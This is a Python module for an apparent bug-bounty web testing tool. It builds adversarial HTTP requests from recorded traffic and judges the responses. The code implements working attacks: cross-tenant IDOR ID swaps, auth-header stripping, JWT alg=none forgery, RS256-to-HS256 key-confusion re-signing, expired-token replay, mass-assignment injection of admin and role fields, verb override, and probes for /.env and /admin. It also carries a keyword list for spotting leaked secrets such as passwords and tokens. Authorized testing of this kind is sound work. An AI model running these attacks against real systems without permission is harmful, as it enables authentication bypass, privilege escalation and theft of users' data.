"""Bounty-shaped mutation library.

Each ``Mutation`` knows how to transform a recorded baseline request into one
or more adversarial requests and what verdict to assign when comparing the
mutated response against the baseline. Mutations are stateless and
deterministic given the same baseline + context.

Adding a new mutation is a four-step recipe:

1. Subclass ``Mutation`` (or write a small one and decorate with ``@register``).
2. Implement ``apply(flow, ctx) -> Iterable[MutatedRequest]``.
3. Implement ``verdict(baseline, mutated, mutated_request) -> str``.
4. Add a one-line summary to ``description``.

This file ships the bounty-shaped starter set — IDOR (swap/overflow), auth
strip + JWT confusion family, mass-assignment payload injection, HTTP-verb /
content-type tampering. Suites pick from these by name and pin expectations.
"""

from __future__ import annotations

import base64
import copy
import hashlib
import hmac
import json
import re
from collections.abc import Iterable
from dataclasses import dataclass, field
from typing import Any

# Verdict literals — kept as strings (not Enum) so suite YAML can reference
# them directly without an import.
VERDICT_NO_DIFF = "no_diff"
VERDICT_STATUS_CHANGE = "status_change"
VERDICT_LEAK_DETECTED = "leak_detected"
VERDICT_AUTH_BYPASSED = "auth_bypassed"
VERDICT_ERROR = "error"

# Response-body markers that elevate a mutation result to ``leak_detected``.
# Lowercased substrings.
_LEAK_KEYS = (
    "email",
    "phone",
    "user_id",
    "userid",
    "order_id",
    "address",
    "ssn",
    "balance",
    "credit_card",
    "ccnum",
    "iban",
    "token",
    "session",
    "password",
)


# ── data shapes ─────────────────────────────────────────────────────────────


@dataclass
class MutatedRequest:
    """A single concrete request derived from one baseline + one mutation."""

    url: str
    method: str
    headers: dict[str, str] = field(default_factory=dict)
    body: bytes | None = None
    # Free-form annotation explaining *what* was changed (for the report).
    note: str = ""


@dataclass
class MutationContext:
    """Per-replay context that mutations can read.

    ``session_pool`` lets cross-tenant mutations (swap_user_id) pull a
    sibling user's identifiers. Each entry is a dict with at minimum
    ``identity_id`` and optionally ``auth_header`` / ``cookie`` / ``jwt``.
    """

    session_pool: dict[str, dict[str, Any]] = field(default_factory=dict)
    extras: dict[str, Any] = field(default_factory=dict)


@dataclass
class MutationResult:
    mutation_name: str
    flow_id: str
    mutated_request: dict[str, Any]
    baseline_response: dict[str, Any]
    mutated_response: dict[str, Any]
    verdict: str
    evidence: list[str] = field(default_factory=list)


# ── mutation base ───────────────────────────────────────────────────────────


class Mutation:
    """Abstract mutation. Override ``apply`` and ``verdict``."""

    name: str = ""
    description: str = ""

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        raise NotImplementedError

    def verdict(
        self,
        baseline: dict[str, Any],
        mutated: dict[str, Any],
        mutated_request: MutatedRequest,
    ) -> tuple[str, list[str]]:
        """Default verdict: any 2xx response after auth-changing or ID-changing
        mutation is suspicious. Subclasses override to tighten signal.
        """
        base_status = (baseline.get("response") or {}).get("status", 0)
        mut_status = (mutated.get("response") or mutated).get("status", 0)
        if mut_status == 0:
            return VERDICT_ERROR, ["mutated request failed (status=0)"]
        if 200 <= mut_status < 300 and _response_has_leak_keys(mutated):
            return VERDICT_LEAK_DETECTED, _leak_evidence(mutated)
        if base_status != mut_status:
            return (
                VERDICT_STATUS_CHANGE,
                [f"baseline status {base_status} -> mutated status {mut_status}"],
            )
        return VERDICT_NO_DIFF, []


# Registry of built-in mutations. ``register()`` adds to this dict.

BUILTIN_MUTATIONS: dict[str, Mutation] = {}


def register(mutation: Mutation) -> Mutation:
    if not mutation.name:
        raise ValueError(f"mutation has no name: {mutation!r}")
    if mutation.name in BUILTIN_MUTATIONS:
        raise ValueError(f"duplicate mutation name {mutation.name!r}")
    BUILTIN_MUTATIONS[mutation.name] = mutation
    return mutation


# ── IDOR family ────────────────────────────────────────────────────────────


_NUMERIC_PATH_RE = re.compile(r"^\d+$")
_UUID_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
)


def _find_path_id_positions(url: str) -> list[tuple[int, str, str]]:
    """Return list of ``(segment_index, value, kind)`` for ID-like path segs."""
    from urllib.parse import urlparse

    parts = urlparse(url).path.split("/")
    out: list[tuple[int, str, str]] = []
    for i, seg in enumerate(parts):
        if not seg:
            continue
        if _NUMERIC_PATH_RE.match(seg):
            out.append((i, seg, "numeric"))
        elif _UUID_RE.match(seg):
            out.append((i, seg, "uuid"))
        elif len(seg) >= 16 and re.fullmatch(r"[A-Za-z0-9_-]+", seg):
            out.append((i, seg, "opaque"))
    return out


def _replace_path_segment(url: str, index: int, new_value: str) -> str:
    from urllib.parse import urlparse, urlunparse

    parts = urlparse(url)
    segs = parts.path.split("/")
    if 0 <= index < len(segs):
        segs[index] = new_value
    return urlunparse(parts._replace(path="/".join(segs)))


class SwapUserIdMutation(Mutation):
    name = "swap_user_id"
    description = (
        "For each ID-shaped path segment in the request, substitute the same "
        "position from another user in the session_pool. Cross-tenant IDOR test."
    )

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        url = str(request.get("url") or "")
        positions = _find_path_id_positions(url)
        if not positions or not ctx.session_pool:
            return []
        out: list[MutatedRequest] = []
        for label, creds in ctx.session_pool.items():
            identity = creds.get("identity_id") if isinstance(creds, dict) else None
            if not identity:
                continue
            for idx, value, kind in positions:
                if value == identity:
                    continue
                new_url = _replace_path_segment(url, idx, str(identity))
                out.append(
                    MutatedRequest(
                        url=new_url,
                        method=str(request.get("method") or "GET"),
                        headers=dict(request.get("headers") or {}),
                        body=_body_bytes(request),
                        note=f"swap path segment {idx} {value!r}->{identity!r} (label={label}, kind={kind})",
                    )
                )
        return out


class IntegerOverflowIdMutation(Mutation):
    name = "integer_overflow_id"
    description = "Replace numeric IDs with 2**31-1, 2**63-1, -1, 0 boundaries."

    BOUNDARIES = ("0", "-1", "2147483647", "9223372036854775807")

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        url = str(request.get("url") or "")
        out: list[MutatedRequest] = []
        for idx, value, kind in _find_path_id_positions(url):
            if kind != "numeric":
                continue
            for boundary in self.BOUNDARIES:
                if boundary == value:
                    continue
                out.append(
                    MutatedRequest(
                        url=_replace_path_segment(url, idx, boundary),
                        method=str(request.get("method") or "GET"),
                        headers=dict(request.get("headers") or {}),
                        body=_body_bytes(request),
                        note=f"integer boundary {value!r}->{boundary!r} at path seg {idx}",
                    )
                )
        return out


# ── Auth family ─────────────────────────────────────────────────────────────


_AUTH_HEADERS = ("authorization", "cookie", "x-api-key", "x-auth-token", "x-session-token")


class StripAuthMutation(Mutation):
    name = "strip_auth"
    description = "Remove every recognized auth-bearing header. 2xx response = auth check missing."

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        headers = {k: v for k, v in (request.get("headers") or {}).items() if k.lower() not in _AUTH_HEADERS}
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "GET"),
                headers=headers,
                body=_body_bytes(request),
                note="stripped: " + ", ".join(_AUTH_HEADERS),
            )
        ]

    def verdict(self, baseline, mutated, mutated_request):
        base_status = (baseline.get("response") or {}).get("status", 0)
        mut_status = (mutated.get("response") or mutated).get("status", 0)
        if 200 <= mut_status < 300 and 200 <= base_status < 300:
            return VERDICT_AUTH_BYPASSED, [
                f"baseline auth'd response was {base_status}, response without auth is {mut_status}"
            ]
        return super().verdict(baseline, mutated, mutated_request)


class JwtAlgNoneMutation(Mutation):
    name = "jwt_alg_none"
    description = "Replace JWT in Authorization with header.payload. + alg=none."

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        headers = dict(request.get("headers") or {})
        new_token = _mutate_jwt_alg_none(_find_bearer(headers))
        if not new_token:
            return []
        headers = _set_bearer(headers, new_token)
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "GET"),
                headers=headers,
                body=_body_bytes(request),
                note="jwt alg=none, signature stripped",
            )
        ]

    def verdict(self, baseline, mutated, mutated_request):
        mut_status = (mutated.get("response") or mutated).get("status", 0)
        if 200 <= mut_status < 300:
            return VERDICT_AUTH_BYPASSED, ["server accepted alg=none JWT"]
        return super().verdict(baseline, mutated, mutated_request)


class JwtConfusionRs256Hs256(Mutation):
    name = "jwt_rs256_to_hs256_confusion"
    description = (
        "Algorithm-confusion attack: sign the existing payload with HS256 using "
        "the server's public key as the HMAC secret (provided via "
        "ctx.extras['rs256_public_key_pem'])."
    )

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        headers = dict(request.get("headers") or {})
        pubkey = (ctx.extras or {}).get("rs256_public_key_pem")
        if not pubkey:
            return []
        token = _find_bearer(headers)
        new = _jwt_resign_hs256_with_public_key(token, str(pubkey))
        if not new:
            return []
        headers = _set_bearer(headers, new)
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "GET"),
                headers=headers,
                body=_body_bytes(request),
                note="RS256->HS256 confusion using server public key as HMAC secret",
            )
        ]

    def verdict(self, baseline, mutated, mutated_request):
        mut_status = (mutated.get("response") or mutated).get("status", 0)
        if 200 <= mut_status < 300:
            return VERDICT_AUTH_BYPASSED, ["RS256->HS256 confusion accepted"]
        return super().verdict(baseline, mutated, mutated_request)


class JwtExpiredReplay(Mutation):
    name = "jwt_expired_replay"
    description = (
        "Replay the same JWT with ``exp`` rewritten 1 hour in the past. If the "
        "server accepts it, the expiry isn't checked."
    )

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        headers = dict(request.get("headers") or {})
        token = _find_bearer(headers)
        new = _jwt_rewrite_exp(token, offset_seconds=-3600)
        if not new:
            return []
        headers = _set_bearer(headers, new)
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "GET"),
                headers=headers,
                body=_body_bytes(request),
                note="exp rewritten to one hour ago (signature NOT updated -> if accepted, exp ignored OR sig not verified)",
            )
        ]


# ── Mass-assignment family ──────────────────────────────────────────────────


_PRIVILEGED_KEYS = {
    "role": "admin",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "permission": "admin",
    "permissions": ["admin"],
    "user_type": "admin",
    "userType": "admin",
    "kyc_level": 99,
    "tier": "premium",
}


class MassAssignmentInject(Mutation):
    name = "mass_assignment_inject_privileged_fields"
    description = (
        "Inject role / is_admin / permission fields into the request body. "
        "Server-side that doesn't strip unknown fields will write them through."
    )

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        body_bytes = _body_bytes(request) or b""
        try:
            body_obj = json.loads(body_bytes.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            return []
        if not isinstance(body_obj, dict):
            return []
        injected = dict(body_obj)
        injected.update(_PRIVILEGED_KEYS)
        new_body = json.dumps(injected).encode("utf-8")
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "GET"),
                headers=dict(request.get("headers") or {}),
                body=new_body,
                note="injected: " + ", ".join(_PRIVILEGED_KEYS),
            )
        ]


# ── Tamper / HTTP-shape family ─────────────────────────────────────────────


class MethodSwap(Mutation):
    name = "method_swap"
    description = "Try DELETE / PUT / PATCH against a GET endpoint. Often reveals unauth state mutation."

    PROBES = ("DELETE", "PUT", "PATCH", "POST")

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        method = str(request.get("method") or "GET").upper()
        if method != "GET":
            return []
        out: list[MutatedRequest] = []
        for probe in self.PROBES:
            out.append(
                MutatedRequest(
                    url=str(request.get("url") or ""),
                    method=probe,
                    headers=dict(request.get("headers") or {}),
                    body=_body_bytes(request),
                    note=f"method swap GET->{probe}",
                )
            )
        return out


class VerbTunnelOverride(Mutation):
    name = "verb_tunnel_override"
    description = "Add X-HTTP-Method-Override: DELETE on a GET request to see if the framework honors it."

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        method = str(request.get("method") or "GET").upper()
        if method != "GET":
            return []
        headers = dict(request.get("headers") or {})
        headers["X-HTTP-Method-Override"] = "DELETE"
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method="GET",
                headers=headers,
                body=_body_bytes(request),
                note="X-HTTP-Method-Override: DELETE",
            )
        ]


class ContentTypeSwap(Mutation):
    name = "content_type_swap"
    description = "Swap application/json -> application/xml. XXE / framework-parser surface."

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        request = flow.get("request") or {}
        headers = dict(request.get("headers") or {})
        ct = next((v for k, v in headers.items() if k.lower() == "content-type"), None)
        if not ct or "json" not in ct.lower():
            return []
        headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
        headers["Content-Type"] = "application/xml"
        return [
            MutatedRequest(
                url=str(request.get("url") or ""),
                method=str(request.get("method") or "POST"),
                headers=headers,
                body=_body_bytes(request),
                note="content-type -> application/xml",
            )
        ]


# ── Path-shape family ──────────────────────────────────────────────────────


class PathExtraSegment(Mutation):
    name = "path_extra_admin_segment"
    description = "Append /admin or /internal to the path."

    PROBES = ("/admin", "/internal", "/debug", "/.env", "/swagger")

    def apply(self, flow: dict[str, Any], ctx: MutationContext) -> Iterable[MutatedRequest]:
        from urllib.parse import urlparse, urlunparse

        request = flow.get("request") or {}
        url = str(request.get("url") or "")
        parts = urlparse(url)
        out: list[MutatedRequest] = []
        for probe in self.PROBES:
            new = urlunparse(parts._replace(path=parts.path.rstrip("/") + probe))
            out.append(
                MutatedRequest(
                    url=new,
                    method=str(request.get("method") or "GET"),
                    headers=dict(request.get("headers") or {}),
                    body=_body_bytes(request),
                    note=f"appended path segment {probe}",
                )
            )
        return out


# ── helpers ─────────────────────────────────────────────────────────────────


def _body_bytes(request: dict[str, Any]) -> bytes | None:
    b64 = request.get("body_b64")
    if not b64:
        return None
    try:
        return base64.b64decode(b64)
    except Exception:
        return None


def _response_has_leak_keys(response_or_flow: dict[str, Any]) -> bool:
    resp = response_or_flow.get("response") or response_or_flow
    body_b64 = (resp.get("body_b64") if isinstance(resp, dict) else None) or ""
    if not body_b64:
        return False
    try:
        body = base64.b64decode(body_b64).decode("utf-8", "ignore").lower()
    except Exception:
        return False
    return any(k in body for k in _LEAK_KEYS)


def _leak_evidence(response_or_flow: dict[str, Any]) -> list[str]:
    resp = response_or_flow.get("response") or response_or_flow
    body_b64 = (resp.get("body_b64") if isinstance(resp, dict) else None) or ""
    if not body_b64:
        return []
    try:
        body = base64.b64decode(body_b64).decode("utf-8", "ignore").lower()
    except Exception:
        return []
    return [k for k in _LEAK_KEYS if k in body]


def _find_bearer(headers: dict[str, str]) -> str | None:
    for k, v in headers.items():
        if k.lower() == "authorization" and isinstance(v, str) and v.lower().startswith("bearer "):
            return v.split(" ", 1)[1]
    return None


def _set_bearer(headers: dict[str, str], token: str) -> dict[str, str]:
    out = {k: v for k, v in headers.items() if k.lower() != "authorization"}
    out["Authorization"] = f"Bearer {token}"
    return out


def _b64u_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _split_jwt(token: str | None) -> tuple[dict, dict, str] | None:
    if not token or token.count(".") != 2:
        return None
    h_b64, p_b64, sig = token.split(".")
    try:
        header = json.loads(_b64u_decode(h_b64))
        payload = json.loads(_b64u_decode(p_b64))
    except (json.JSONDecodeError, ValueError):
        return None
    return header, payload, sig


def _mutate_jwt_alg_none(token: str | None) -> str | None:
    parts = _split_jwt(token)
    if not parts:
        return None
    header, payload, _ = parts
    header = copy.deepcopy(header)
    header["alg"] = "none"
    return f"{_b64u_encode(json.dumps(header).encode())}.{_b64u_encode(json.dumps(payload).encode())}."


def _jwt_resign_hs256_with_public_key(token: str | None, pem: str) -> str | None:
    parts = _split_jwt(token)
    if not parts:
        return None
    header, payload, _ = parts
    header = copy.deepcopy(header)
    header["alg"] = "HS256"
    h_b64 = _b64u_encode(json.dumps(header, sort_keys=True).encode())
    p_b64 = _b64u_encode(json.dumps(payload, sort_keys=True).encode())
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    secret = pem.encode("utf-8")
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64u_encode(sig)}"


def _jwt_rewrite_exp(token: str | None, *, offset_seconds: int) -> str | None:
    import time as _time

    parts = _split_jwt(token)
    if not parts:
        return None
    header, payload, sig = parts
    payload = copy.deepcopy(payload)
    payload["exp"] = int(_time.time()) + offset_seconds
    h_b64 = _b64u_encode(json.dumps(header).encode())
    p_b64 = _b64u_encode(json.dumps(payload).encode())
    return f"{h_b64}.{p_b64}.{sig}"


# ── registration ───────────────────────────────────────────────────────────


for _m in (
    SwapUserIdMutation(),
    IntegerOverflowIdMutation(),
    StripAuthMutation(),
    JwtAlgNoneMutation(),
    JwtConfusionRs256Hs256(),
    JwtExpiredReplay(),
    MassAssignmentInject(),
    MethodSwap(),
    VerbTunnelOverride(),
    ContentTypeSwap(),
    PathExtraSegment(),
):
    register(_m)


__all__ = [
    "BUILTIN_MUTATIONS",
    "Mutation",
    "MutationContext",
    "MutatedRequest",
    "MutationResult",
    "VERDICT_AUTH_BYPASSED",
    "VERDICT_ERROR",
    "VERDICT_LEAK_DETECTED",
    "VERDICT_NO_DIFF",
    "VERDICT_STATUS_CHANGE",
    "register",
]
